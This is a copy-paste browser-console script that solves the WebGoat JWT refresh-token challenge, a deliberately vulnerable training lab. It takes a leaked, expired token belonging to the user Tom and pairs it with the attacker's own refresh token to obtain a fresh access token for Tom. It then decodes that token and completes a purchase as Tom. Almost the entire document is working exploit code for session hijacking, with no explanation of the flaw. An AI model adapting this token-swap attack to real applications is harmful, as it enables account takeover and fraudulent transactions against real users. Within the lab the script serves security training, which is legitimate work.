// JWT REFRESH TOKEN ATTACK - ULTRA CLEAN VERSION
// NO SPECIAL CHARACTERS - GUARANTEED TO WORK
// Copy and paste this entire script into the browser console

(function() {
    console.log('===================================================');
    console.log('JWT REFRESH TOKEN ATTACK - STARTING');
    console.log('===================================================');
    
    // Tom's expired token from access log
    const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
    
    console.log('[Step 1] Checking for refresh token...');
    
    if (!window.myRefreshToken) {
        console.log('[ERROR] No refresh token found!');
        console.log('[ACTION REQUIRED] Please run get_fresh_token.js first');
        console.log('[INFO] Or click the Checkout button and check Network tab for refresh_token');
        return;
    }
    
    console.log('[OK] Using refresh token: ' + window.myRefreshToken.substring(0, 20) + '...');
    
    console.log('[Step 2] Sending attack request...');
    console.log('[INFO] Authorization: Bearer <Toms expired token>');
    console.log('[INFO] Body: refresh_token = <Jerrys fresh token>');
    
    fetch('/WebGoat/JWT/refresh/newToken', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            refresh_token: window.myRefreshToken
        })
    })
    .then(response => {
        console.log('[Response] Status: ' + response.status);
        if (!response.ok) {
            console.log('[ERROR] HTTP ' + response.status + ' - Attack failed');
            if (response.status === 401) {
                console.log('[HINT] 401 = Refresh token expired/invalid');
                console.log('[FIX] Click Checkout button to get fresh token');
            }
            throw new Error('HTTP ' + response.status);
        }
        return response.json();
    })
    .then(data => {
        console.log('[SUCCESS] Got response!');
        console.log('[DATA] ' + JSON.stringify(data, null, 2));
        
        if (data.access_token) {
            window.tomsNewToken = data.access_token;
            console.log('[SAVED] window.tomsNewToken = ' + window.tomsNewToken.substring(0, 50) + '...');
            
            // Decode and verify
            try {
                const payload = JSON.parse(atob(window.tomsNewToken.split('.')[1]));
                console.log('[DECODED] ' + JSON.stringify(payload, null, 2));
                
                if (payload.user === 'Tom') {
                    console.log('[VERIFIED] Token belongs to TOM!');
                    
                    // Now checkout as Tom
                    console.log('[Step 3] Checking out as Tom...');
                    return fetch('/WebGoat/JWT/refresh/checkout', {
                        method: 'POST',
                        headers: {
                            'Authorization': 'Bearer ' + window.tomsNewToken,
                            'Content-Type': 'application/json'
                        }
                    });
                } else {
                    console.log('[ERROR] Token user is: ' + payload.user);
                }
            } catch(e) {
                console.log('[ERROR] Could not decode token: ' + e.message);
            }
        } else {
            console.log('[ERROR] No access_token in response');
        }
    })
    .then(response => {
        if (response) {
            console.log('[Checkout] Status: ' + response.status);
            return response.json();
        }
    })
    .then(data => {
        if (data) {
            console.log('[FINAL RESULT] ' + JSON.stringify(data, null, 2));
            if (data.lessonCompleted) {
                console.log('===================================================');
                console.log('SUCCESS! CHALLENGE COMPLETED!');
                console.log('Tom paid $31.53 for the books!');
                console.log('===================================================');
            }
        }
    })
    .catch(error => {
        console.log('[ERROR] ' + error.message);
        console.log('[DEBUG] Check Network tab for details');
    });
})();
